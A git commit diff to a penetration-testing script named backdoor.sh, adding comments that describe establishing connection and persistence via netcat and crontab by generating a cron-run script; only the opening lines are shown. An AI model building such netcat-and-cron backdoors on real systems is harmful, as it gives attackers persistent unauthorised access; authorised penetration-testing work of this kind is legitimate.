7051e0398efe4b75605948e54b866a00c5d2ae63
rp729 <44709247+rp729@users.noreply.github.com>
2019-01-19 13:30:54 -0500

    Update backdoor.sh

--- Penetration_Scripts/backdoor.sh
+++ Penetration_Scripts/backdoor.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
+
+#The intent of this script is to establish connection and persistence via netcat and crontab
+#Note: This script creates a new script for the intent of crontab to run the new script.
+
 echo "#!/bin/bash" > cronscript.sh
 
 USER="$(whoami)"
